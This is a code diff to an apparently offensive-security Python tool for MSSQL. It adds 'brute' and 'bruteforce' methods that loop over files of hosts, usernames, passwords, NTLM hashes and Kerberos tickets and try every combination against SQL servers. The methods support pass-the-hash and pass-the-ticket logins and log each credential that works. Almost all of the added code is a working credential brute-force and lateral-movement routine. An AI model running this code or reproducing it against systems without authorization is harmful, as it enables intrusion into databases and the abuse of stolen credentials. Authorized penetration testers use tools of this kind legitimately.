@@ -1,7 +1,7 @@
 ########################################################
 __author__ = ['Nimrod Levy']
 __license__ = 'GPL v3'
-__version__ = 'v1.3.1'
+__version__ = 'v1.3.2'
 __email__ = ['El3ct71k@gmail.com']
 
 ########################################################
@@ -376,3 +376,105 @@ class Playbooks(Operations):
                 continue
             break
         return True
+
+    def brute(self, host: str, port: int, user: str, domain: str, cred: str,
+              auth_type: Literal['ticket', 'hash', 'password']) -> bool:
+        self.options.port = port
+        mssql_client = Playbooks(host, port, self.options)
+        if auth_type == 'ticket':
+            if utilities.is_valid_ip(host):
+                LOG.warning(f"Skipping the {host} host since tickets are not supported for IP addresses")
+                return False
+
+            os.environ['KRB5CCNAME'] = cred.strip()
+            mssql_client.options.k = True
+            mssql_client.options.no_pass = True
+            mssql_client.options.hashes = None
+            password = ""
+        elif auth_type == 'hash':
+            mssql_client.options.k = self.options.k
+            mssql_client.options.no_pass = False
+            mssql_client.options.hashes = cred.strip().lower()
+            password = ""
+        else:
+            mssql_client.options.k = self.options.k
+            mssql_client.options.no_pass = False
+            mssql_client.options.hashes = None
+            password = cred.strip()
+        LOG.setLevel(logging.CRITICAL)
+        if domain:
+            mssql_client.options.windows_auth = True
+        if mssql_client.connect(user, password, domain):
+            LOG.setLevel(logging.INFO)
+            LOG.info(f"Successfully connecnted to {host} with user {user} and {auth_type} {cred}")
+            return True
+        LOG.setLevel(logging.DEBUG if self.debug else logging.INFO)
+        return False
+
+    def bruteforce(self, hosts_list: str, user_list: str, password_list: str, hash_list: str, ticket_list: str):
+        if not os.path.exists(hosts_list):
+            LOG.error(f"{hosts_list} hosts file does not exist")
+            return False
+        if not os.path.exists(password_list) and not os.path.exists(hash_list) and not os.path.exists(ticket_list):
+            LOG.error("You should provide at least one of the password, hash or ticket list")
+            return False
+        if not os.path.exists(user_list):
+            LOG.error(f"{user_list} users file does not exist")
+            return False
+        hosts_list_content = open(hosts_list, 'r').readlines()
+        user_list_content = open(user_list, 'r').readlines()
+        password_list_content = []
+        hash_list_content = []
+        ticket_list_content = []
+
+        if os.path.exists(password_list):
+            password_list_content = open(password_list, 'r').readlines()
+        if os.path.exists(hash_list):
+            hash_list_content = open(hash_list, 'r').readlines()
+        if os.path.exists(ticket_list):
+            ticket_list_content = open(ticket_list, 'r').readlines()
+
+        for host_line in hosts_list_content:
+            host_line = host_line.strip()
+            if not host_line:
+                continue
+            if not host_line.split(":")[-1].isdigit():
+                LOG.error(f"{host_line} is not a valid host, it should be host:port")
+                continue
+
+            host, port = host_line.split(":")
+
+            for user in user_list_content:
+                user = user.strip()
+                if not user:
+                    continue
+
+                domain = ""
+                if "/" in user:
+                    domain = user.split("/")[0]
+                    user = user.split("/")[1]
+
+                for ticket in ticket_list_content:
+                    ticket = ticket.strip()
+                    if not ticket:
+                        continue
+                    self.brute(host, port, user, domain, ticket, 'ticket')
+
+                for ntlm_hash in hash_list_content:
+                    ntlm_hash = ntlm_hash.strip()
+                    if not ntlm_hash:
+                        continue
+
+                    if ":" not in ntlm_hash:
+                        LOG.error(f"{ntlm_hash} is not a valid NTLM hash, NTLM hash should be in that format: NT:LM")
+                        continue
+                    self.brute(host, port, user, domain, ntlm_hash, 'hash')
+
+                for password in password_list_content:
+                    password = password.strip()
+                    if not password:
+                        continue
+                    self.brute(host, port, user, domain, password, 'password')
+
+
+
